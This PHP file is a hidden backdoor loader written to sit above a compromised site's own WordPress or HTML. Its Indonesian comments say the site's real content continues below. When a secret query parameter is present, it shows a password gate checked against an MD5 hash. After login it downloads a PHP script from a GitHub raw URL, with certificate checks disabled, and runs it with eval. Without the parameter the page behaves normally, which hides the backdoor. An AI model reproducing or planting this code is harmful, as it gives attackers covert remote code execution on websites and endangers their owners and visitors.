<?php
session_start();

/**
 * SEMUA LOGIC lament HANYA AKTIF KALAU ADA ?lament
 * TANPA ?lament, blok if ini dilewati, dan HTML/WordPress di bawah tetap jalan.
 */

if (isset($_GET['lament'])) {

    // ----- fungsi helper -----
    function geturlsinfo($url) {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            if (isset($_SESSION['coki'])) {
                curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
            }

            $data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $h = fopen($url, "r");
            $data = stream_get_contents($h);
            fclose($h);
        } else {
            $data = false;
        }

        return $data;
    }

    function is_logged_in() {
        return !empty($_SESSION['logged_in']);
    }

    // template login (HANYA form, bukan <html> penuh kalau kamu mau overlay)
    $passwordtemplate = '
        <form method="POST" action="">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="Login">
        </form>
    ';

    // proses password
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password  = 'a43ce4349a3a5ba1f3ac9d3ad6e845b2'; // MD5 kamu

        if (md5($entered_password) === $hashed_password) {
            $_SESSION['logged_in'] = true;
            $_SESSION['coki'] = 'asu';
        } else {
            echo "Incorrect password. Please try again.<br>";
        }
    }

    // kalau sudah login → load remote
    if (is_logged_in()) {
        $a = geturlsinfo('https://raw.githubusercontent.com/lamentpicasso/picasso/main/yellow.php'); // ganti URL mu
        if ($a !== false) {
            eval('?>' . $a);
        } else {
            echo "Unable to load content.";
        }
    } else {
        // belum login → tampilkan form
        echo $passwordtemplate;
    }

    // SANGAT PENTING:
    // kita stop di sini supaya konten asli situs tidak ikut tampil di mode lament
    exit;
}

// ---- DI BAWAH SINI HTML / WORDPRESS ASLI MEREKA ----
// jangan ada return/exit lagi di atas sini
?>
